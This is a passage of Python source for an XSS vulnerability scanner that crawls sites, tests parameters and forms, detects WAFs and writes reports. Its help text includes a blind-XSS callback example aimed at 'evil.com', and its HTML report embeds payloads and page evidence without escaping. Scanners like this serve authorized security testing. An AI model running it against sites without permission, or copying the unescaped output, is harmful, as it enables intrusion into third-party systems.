            is_waf, waf_name, waf_info = detect_waf(body, resp_headers)
            if is_waf and waf_info.get("blocked"):
                if stats:
                    stats.waf_hits += 1

            screenshot = capture_screenshot(base_url, test_payload, param_name)

            vulns.append(_build_vuln(
                base_url, param_name, method, test_payload,
                contexts, body, stats, waf_detected=is_waf, screenshot=screenshot
            ))

        except Exception as e:
            if stats:
                stats.errors += 1

    return vulns


def _build_vuln(url: str, param: str, method: str, payload: str,
                contexts: list[str], body: str, stats: Optional[ScanStats],
                waf_detected: bool = False,
                callback_received: bool = False,
                screenshot: Optional[str] = None) -> Vulnerability:
    primary = contexts[0] if contexts else "unknown"
    severity = severity_from_context(contexts)

    if stats:
        stats.vulns_found += 1
        if severity == "critical":
            stats.critical_count += 1
        elif severity == "high":
            stats.high_count += 1
        elif severity == "medium":
            stats.medium_count += 1
        else:
            stats.low_count += 1

    # Evidence slice
    evidence = ""
    idx = body.lower().find(payload.lower())
    if idx >= 0:
        evidence = body[max(0, idx-40):idx+len(payload)+40]

    return Vulnerability(
        url=url,
        param=param,
        method=method,
        payload=payload,
        context="url_param" if method == "GET" else "form_field",
        injection_point=primary,
        severity=severity,
        evidence=evidence,
        raw_reflection=payload,
        waf_detected=waf_detected,
        callback_received=callback_received,
        screenshot_path=screenshot,
        timestamp=datetime.now(timezone.utc).isoformat(),
    )


def scan_url(url: str,
             client: HTTPClient,
             stats: ScanStats,
             follow_external: bool = False,
             depth: int = 1,
             blind_callback: Optional[str] = None) -> tuple[list[Vulnerability], list[str], dict]:
    """
    Scan a single URL. Returns (vulns, next_urls, waf_info).
    """
    vulns: list[Vulnerability] = []
    next_urls: list[str] = []
    waf_info: dict = {}
    stats.urls_scanned += 1

    if _shutdown_requested:
        return [], [], {}

    try:
        body, resp_headers, status = client.request(url, method="GET")
    except Exception as e:
        stats.errors += 1
        return [], [], {}

    # WAF detection on initial response
    is_waf, waf_name, waf_info = detect_waf(body, resp_headers)
    if is_waf:
        if stats:
            stats.waf_hits += 1

    # Security header analysis (run once per URL)
    # (Done at report level, not per param)

    # Test URL params
    params = extract_params(url)
    for pname, pval in params:
        if _shutdown_requested:
            break
        stats.params_tested += 1
        found = test_param_for_xss(
            url, pname, pval,
            method="GET",
            client=client,
            stats=stats,
            blind_callback=blind_callback,
            waf_active=is_waf,
        )
        vulns.extend(found)

    # Extract and test forms
    forms = extract_forms(body, url)
    for form in forms:
        form_url = form["action"]
        method = form["method"]
        for field in form["fields"]:
            if field["type"] in ("submit", "button", "reset", "hidden", "image", "file"):
                continue
            if _shutdown_requested:
                break
            stats.params_tested += 1
            body_params = {f["name"]: f["default"] or "test" for f in form["fields"]}
            found = test_param_for_xss(
                form_url, field["name"], field["default"] or "test",
                method=method,
                body_params=body_params,
                client=client,
                stats=stats,
                blind_callback=blind_callback,
                waf_active=is_waf,
            )
            vulns.extend(found)

    # Extract next links
    if depth > 0:
        next_urls = extract_links(body, url)

    return vulns, next_urls, waf_info


def crawl_and_scan(seed_url: str,
                   client: HTTPClient,
                   stats: ScanStats,
                   max_urls: int = 20,
                   follow_external: bool = False,
                   depth: int = 2,
                   workers: int = 15,
                   blind_callback: Optional[str] = None,
                   quiet: bool = False) -> tuple[list[Vulnerability], dict, list[SecurityHeaders]]:
    """Main crawl+scan loop with BFS."""
    all_vulns: list[Vulnerability] = []
    all_headers: list[SecurityHeaders] = []
    all_waf: dict = {}
    visited: set[str] = set()
    queue: list[str] = [seed_url]
    depth_map: dict[str, int] = {seed_url: depth}

    parsed_seed = urllib.parse.urlparse(seed_url)
    seed_host = parsed_seed.netloc

    while queue:
        if _shutdown_requested:
            if not quiet:
                print("[*] Graceful shutdown in progress...", file=sys.stderr)
            break

        current_url = queue.pop(0)
        current_depth = depth_map.get(current_url, 0)

        if current_url in visited:
            continue
        visited.add(current_url)

        vulns, next_links, waf_info = scan_url(
            current_url, client, stats,
            follow_external=follow_external,
            depth=current_depth,
            blind_callback=blind_callback,
        )

        # Collect unique security headers
        if vulns and not all_headers:
            try:
                _, rh, _ = client.request(current_url, method="GET")
                all_headers = analyze_security_headers(rh)
            except Exception:
                pass

        if waf_info:
            all_waf[current_url] = waf_info

        all_vulns.extend(vulns)

        if current_depth > 0:
            for link in next_links:
                if link in visited:
                    continue
                lp = urllib.parse.urlparse(link)
                if not follow_external and lp.netloc != seed_host:
                    continue
                if len(queue) + len(visited) < max_urls:
                    queue.append(link)
                    depth_map[link] = current_depth - 1

        if len(visited) >= max_urls:
            break

        if not quiet and vulns:
            print(f"[+] Found {len(vulns)} vuln(s) on {current_url}", file=sys.stderr)

    return all_vulns, all_waf, all_headers


# ─── Formatters ────────────────────────────────────────────────────────────────

def format_discord(vulns: list[Vulnerability], url: str,
                   stats: ScanStats, waf_info: dict) -> str:
    lines = [
        f"**🚨 EdgeIQ XSS Scan — `{url}`**",
        f"```"
        f"URLs: {stats.urls_scanned} | Params: {stats.params_tested} | "
        f"Payloads: {stats.payloads_sent} | Time: {stats.duration_s:.1f}s | "
        f"Errors: {stats.errors}"
        f"```",
    ]

    if waf_info:
        waf_names = list(set(w["name"] for w in waf_info.values() if w.get("name")))
        if waf_names:
            lines.append(f"> ⚠️ **WAF Detected:** `{', '.join(waf_names)}`")

    if not vulns:
        lines.append("> _No XSS vulnerabilities detected._ ✅")
        return "\n".join(lines)

    crit = [v for v in vulns if v.severity == "critical"]
    high = [v for v in vulns if v.severity == "high"]
    med = [v for v in vulns if v.severity == "medium"]
    low = [v for v in vulns if v.severity == "low"]

    if crit:
        lines.append(f"💥 **Critical — {len(crit)} found**")
        for v in crit[:5]:
            lines.append(f"  `{v.method}` `{v.param}` → `{v.injection_point}`")
            lines.append(f"  Payload: ``")
        if len(crit) > 5:
            lines.append(f"  _...+{len(crit)-5} more_")
        lines.append("")

    if high:
        lines.append(f"⚠️ **High Risk — {len(high)} found**")
        for v in high[:5]:
            lines.append(f"  `{v.method}` `{v.param}` → `{v.injection_point}`")
            lines.append(f"  Payload: `{v.payload[:70]}`")
        if len(high) > 5:
            lines.append(f"  _...+{len(high)-5} more_")
        lines.append("")

    if med:
        lines.append(f"⚡ **Medium Risk — {len(med)} found**")
        for v in med[:3]:
            lines.append(f"  `{v.method}` `{v.param}` → `{v.injection_point}`")
        if len(med) > 3:
            lines.append(f"  _...+{len(med)-3} more_")
        lines.append("")

    if low:
        lines.append(f"🔍 **Low Risk — {len(low)} found**")
        for v in low[:3]:
            lines.append(f"  `{v.param}` → `{v.injection_point}`")

    lines.append(f"\n> **Total: {stats.vulns_found} | Critical:{len(crit)} High:{len(high)} Med:{len(med)} Low:{len(low)}**")

    return "\n".join(lines).strip()


def format_json(vulns: list[Vulnerability], stats: ScanStats,
                headers: list[SecurityHeaders],
                waf_info: dict,
                reflected_params: list,
                scan_id: str) -> str:
    report = ScanReport(
        scan_id=scan_id,
        target_url="",
        started_at="",
        completed_at="",
        duration_s=stats.duration_s,
        stats=stats.to_dict(),
        vulnerabilities=[v.to_dict() for v in vulns],
        security_headers=[asdict(h) for h in headers],
        waf_info=waf_info,
        reflected_params=reflected_params,
    )
    return json.dumps(asdict(report), indent=2)


def format_simple(vulns: list[Vulnerability], stats: ScanStats) -> str:
    lines = [f"XSS Scan Results — {stats.vulns_found} vulnerabilities found"]
    if not vulns:
        lines.append("No vulnerabilities detected.")
        return "\n".join(lines)
    for v in vulns:
        lines.append(
            f"[{v.severity.upper():8s}] {v.method:4s} {v.url} | param={v.param} | "
            f"context={v.injection_point} | payload={v.payload[:60]}"
        )
    lines.append(f"\nScan stats: {stats.urls_scanned} URLs, {stats.params_tested} params, "
                 f"{stats.payloads_sent} payloads, {stats.duration_s:.1f}s")
    return "\n".join(lines)


def export_html(vulns: list[Vulnerability], stats: ScanStats,
                headers: list[SecurityHeaders],
                waf_info: dict,
                url: str,
                scan_id: str) -> str:
    """Generate a self-contained HTML report."""
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    severities = {"critical": "#dc2626", "high": "#ea580c", "medium": "#ca8a04", "low": "#2563eb", "info": "#6b7280"}
    vuln_rows = ""
    for v in vulns:
        color = severities.get(v.severity, "#6b7280")
        vuln_rows += f"""
        <tr class="vuln-row">
            <td><span class="badge" style="background:{color}">{v.severity.upper()}</span></td>
            <td>{v.method}</td>
            <td><code>{v.param}</code></td>
            <td>{v.injection_point}</td>
            <td><code class="payload">{v.payload[:80]}</code></td>
            <td class="evidence">{v.evidence[:120]}</td>
            <td>{v.timestamp[:19] if v.timestamp else 'N/A'}</td>
        </tr>"""

    header_rows = ""
    for h in headers:
        hcolor = "#22c55e" if h.severity == "good" else ("#ea580c" if h.severity == "warning" else "#6b7280")
        header_rows += f"""
        <tr>
            <td><code>{h.header}</code></td>
            <td><code>{h.value[:80]}</code></td>
            <td style="color:{hcolor}">{h.finding}</td>
            <td>{h.severity}</td>
        </tr>"""

    waf_rows = ""
    for wurl, winfo in waf_info.items():
        waf_rows += f"""
        <tr><td>{wurl}</td><td>{winfo.get('name','')}</td><td>{winfo.get('blocked',False)}</td></tr>"""

    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<title>EdgeIQ XSS Scan Report — {url}</title>
<style>
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f172a;color:#e2e8f0;padding:2rem}}
  h1{{color:#f8fafc;border-bottom:2px solid #334155;padding-bottom:.5rem;margin-bottom:1rem}}
  h2{{color:#94a3b8;margin:1.5rem 0 .5rem;font-size:1rem;text-transform:uppercase;letter-spacing:.05em}}
  .summary{{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:.5rem;margin-bottom:1.5rem}}
  .stat{{background:#1e293b;border-radius:6px;padding:.75rem;text-align:center}}
  .stat .val{{font-size:1.5rem;font-weight:700;color:#f8fafc}}
  .stat .lbl{{font-size:.75rem;color:#64748b;text-transform:uppercase}}
  table{{width:100%;border-collapse:collapse;margin-bottom:1rem}}
  th{{background:#1e293b;text-align:left;padding:.5rem;font-size:.75rem;text-transform:uppercase;color:#64748b}}
  td{{padding:.5rem;border-bottom:1px solid #1e293b;font-size:.875rem;vertical-align:top}}
  .badge{{color:#fff;border-radius:4px;padding:.1rem .4rem;font-size:.7rem;font-weight:700}}
  code{{background:#1e293b;border-radius:3px;padding:.1rem .3rem;font-size:.8rem}}
  .payload{{color:#fb923c}}
  .evidence{{color:#94a3b8;font-size:.8rem}}
  .waf{{background:#fbbf24;color:#000;padding:.5rem;border-radius:6px;margin-bottom:1rem}}
  .footer{{margin-top:2rem;text-align:center;color:#64748b;font-size:.75rem}}
</style></head><body>
<h1>🔍 EdgeIQ XSS Scan Report</h1>
<p><strong>Target:</strong> <code>{url}</code></p>
<p><strong>Scan ID:</strong> {scan_id} &nbsp; <strong>Generated:</strong> {now}</p>

<h2>Summary</h2>
<div class="summary">
  <div class="stat"><div class="val">{stats.urls_scanned}</div><div class="lbl">URLs</div></div>
  <div class="stat"><div class="val">{stats.params_tested}</div><div class="lbl">Params</div></div>
  <div class="stat"><div class="val">{stats.vulns_found}</div><div class="lbl">Vulns</div></div>
  <div class="stat"><div class="val">{stats.duration_s:.1f}s</div><div class="lbl">Duration</div></div>
  <div class="stat"><div class="val">{stats.payloads_sent}</div><div class="lbl">Payloads</div></div>
  <div class="stat"><div class="val">{stats.errors}</div><div class="lbl">Errors</div></div>
</div>

<h2>Severity Breakdown</h2>
<div class="summary">
  <div class="stat" style="border-left:3px solid #dc2626"><div class="val">{stats.critical_count}</div><div class="lbl">Critical</div></div>
  <div class="stat" style="border-left:3px solid #ea580c"><div class="val">{stats.high_count}</div><div class="lbl">High</div></div>
  <div class="stat" style="border-left:3px solid #ca8a04"><div class="val">{stats.medium_count}</div><div class="lbl">Medium</div></div>
  <div class="stat" style="border-left:3px solid #2563eb"><div class="val">{stats.low_count}</div><div class="lbl">Low</div></div>
</div>

<h2>Security Headers</h2>
<table><thead><tr><th>Header</th><th>Value</th><th>Finding</th><th>Status</th></tr></thead>
<tbody>{header_rows if header_rows else '<tr><td colspan="4">No headers analyzed</td></tr>'}</tbody></table>

<h2>WAF Detection</h2>
<table><thead><tr><th>URL</th><th>WAF Name</th><th>Blocked</th></tr></thead>
<tbody>{waf_rows if waf_rows else '<tr><td colspan="3">No WAF detected</td></tr>'}</tbody></table>

<h2>Vulnerabilities ({len(vulns)})</h2>
<table><thead><tr><th>Severity</th><th>Method</th><th>Param</th><th>Context</th><th>Payload</th><th>Evidence</th><th>Time</th></tr></thead>
<tbody>{vuln_rows if vuln_rows else '<tr><td colspan="7">No vulnerabilities found ✅</td></tr>'}</tbody></table>

<div class="footer">Generated by EdgeIQ XSS Scanner — For authorized security auditing only</div>
</body></html>"""


# ─── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="EdgeIQ XSS Scanner — Professional XSS Auditing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exit codes:
  0  — No vulnerabilities found
  1  — Vulnerabilities found
  2  — Scan error / target unreachable
  3  — Interrupted (SIGINT/SIGTERM)

Examples:
  python3 scanner.py https://example.com
  python3 scanner.py https://example.com/search?q=test --depth 3 --workers 20
  python3 scanner.py https://example.com --format json --out report.json
  python3 scanner.py https://example.com --proxy http://127.0.0.1:8080 --quiet
  python3 scanner.py https://example.com --auth admin:secret --cookies "session=abc123"
  python3 scanner.py https://example.com --blind-callback https://evil.com/log
  python3 scanner.py https://example.com --analyze-headers --format html --out report.html
        """
    )
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--depth", type=int, default=2, help="Crawl depth (default: 2)")
    parser.add_argument("--max-urls", type=int, default=20, help="Max URLs to crawl (default: 20)")
    parser.add_argument("--workers", type=int, default=15, help="Concurrent workers (default: 15)")
    parser.add_argument("--format", choices=["discord", "json", "simple", "html"], default="discord")
    parser.add_argument("--follow-external", action="store_true", help="Follow links to external domains")
    parser.add_argument("--quiet", "-q", action="store_true", help="Suppress progress output, show only results")
    parser.add_argument("--out", "-o", type=str, help="Write output to file (also sets --quiet)")

    # ── Network options ──
    parser.add_argument("--proxy", type=str, help="HTTP/S proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--user-agent", type=str,
                        default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        help="User-Agent string")
    parser.add_argument("--auth", type=str, help="Basic auth credentials (user:pass)")
    parser.add_argument("--cookies", type=str, help="Cookie string (name=value; name2=value2)")
    parser.add_argument("--custom-header", dest="custom_headers", action="append",
                        help="Custom header (Name: value)", metavar="HDR")
    parser.add_argument("--timeout", type=float, default=15.0, help="Request timeout in seconds (default: 15)")
    parser.add_argument("--rate-limit", type=float, default=0.0,
                        help="Minimum seconds between requests (default: 0)")

    # ── Advanced options ──
    parser.add_argument("--blind-callback", type=str, help="Blind XSS callback URL")
    parser.add_argument("--analyze-headers", action="store_true",
                        help="Analyze HTTP security headers on all discovered URLs")
    parser.add_argument("--reflected-only", action="store_true",
                        help="Only analyze which params are reflected without sending payloads")

    # ── Evidence ──
    parser.add_argument("--screenshot-dir", type=str, default="/tmp/xss-screenshots",
                        help="Directory for evidence screenshots (default: /tmp/xss-screenshots)")

    args = parser.parse_args()

    # ── Premium feature gate ───────────────────────────────────────────────
    if args.blind_callback and not require_license("pro", "Blind XSS Detection"):
        sys.exit(1)
    if args.screenshot_dir and args.screenshot_dir != "/tmp/xss-screenshots":
        if not require_license("pro", "Screenshot Evidence Capture"):
            sys.exit(1)
    if args.format == "html":
        if not is_pro():
            print("╔══════════════════════════════════════════════════════════════════════╗")
            print("║                                                                      ║")
            print("║  HTML report export requires Pro license.                           ║")
            print("║  Upgrade: https://buy.stripe.com/3cI14p0Lxbxr8Ec8AE7wA00              ║")
            print("║                                                                      ║")
            print("╚══════════════════════════════════════════════════════════════════════╝")
            sys.exit(1)
    # ────────────────────────────────────────────────────────────────────────

    quiet = args.quiet or bool(args.out)
    out_file = args.out

    # Parse auth
    auth = None
    if args.auth:
        parts = args.auth.split(":", 1)
        if len(parts) == 2:
            auth = tuple(parts)

    # Parse custom headers
    headers = {}
    if args.custom_headers:
        for hdr in args.custom_headers:
            if ":" in hdr:
                k, v = hdr.split(":", 1)
                headers[k.strip()] = v.strip()

    # Build HTTP client
    client = HTTPClient(
        proxy_url=args.proxy,
        user_agent=args.user_agent,
        timeout=args.timeout,
        rate_limit=args.rate_limit,
        auth=auth,
    )
    if args.cookies:
        # Re-build with cookies via headers
        client = HTTPClient(
            proxy_url=args.proxy,
            user_agent=args.user_agent,
            timeout=args.timeout,
            rate_limit=args.rate_limit,
            auth=auth,
        )
        headers["Cookie"] = args.cookies

    # Validate URL
    target = args.url
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    import uuid
    scan_id = uuid.uuid4().hex[:12]

    stats = ScanStats(start_time=time.perf_counter())

    if not quiet:
        print(f"[*] EdgeIQ XSS Scanner — scan {scan_id}", file=sys.stderr)
        print(f"[*] Target: {target}", file=sys.stderr)
        print(f"[*] Depth: {args.depth} | Max URLs: {args.max_urls} | Workers: {args.workers}", file=sys.stderr)
        if args.proxy:
            print(f"[*] Proxy: {args.proxy}", file=sys.stderr)
        if args.blind_callback:
            print(f"[*] Blind callback: {args.blind_callback}", file=sys.stderr)
        print(f"[*] Starting scan...", file=sys.stderr)

    try:
        vulns, waf_info, sec_headers = crawl_and_scan(
            seed_url=target,
            client=client,
            stats=stats,
            max_urls=args.max_urls,
            follow_external=args.follow_external,
            depth=args.depth,
            workers=args.workers,
            blind_callback=args.blind_callback,
            quiet=quiet,
        )
        stats.duration_s = time.perf_counter() - stats.start_time

        # Reflected params analysis
        reflected_params: list = []
        if args.analyze_headers:
            if not quiet:
                print("[*] Analyzing reflected parameters...", file=sys.stderr)
            try:
                reflected_params = analyze_reflected_params(target, client)
            except Exception:
                pass

        # Security headers on target URL (if no vulns found, still show headers)
        if args.analyze_headers and not sec_headers:
            try:
                _, rh, _ = client.request(target, method="GET")
                sec_headers = analyze_security_headers(rh)
            except Exception:
                pass

    except ConnectionError as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
        sys.exit(2)
    finally:
        stats.duration_s = time.perf_counter() - stats.start_time

    # Determine exit code
    if _shutdown_requested:
        stats.exit_code = 3
    elif stats.vulns_found > 0:
        stats.exit_code = 1
    else:
        stats.exit_code = 0

    # Format output
    if args.format == "discord":
        output = format_discord(vulns, target, stats, waf_info)
    elif args.format == "json":
        output = format_json(vulns, stats, sec_headers, waf_info, reflected_params, scan_id)
    elif args.format == "html":
        output = export_html(vulns, stats, sec_headers, waf_info, target, scan_id)
    else:
        output = format_simple(vulns, stats)

    if out_file:
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(output)
        if not quiet:
            print(f"[*] Report written to {out_file}", file=sys.stderr)
    else:
        print(output)

    if not quiet:
        print(f"[*] Scan complete — {stats.vulns_found} vulns, "
              f"{stats.duration_s:.1f}s, exit={stats.exit_code}", file=sys.stderr)

    sys.exit(stats.exit_code)


if __name__ == "__main__":
    main()
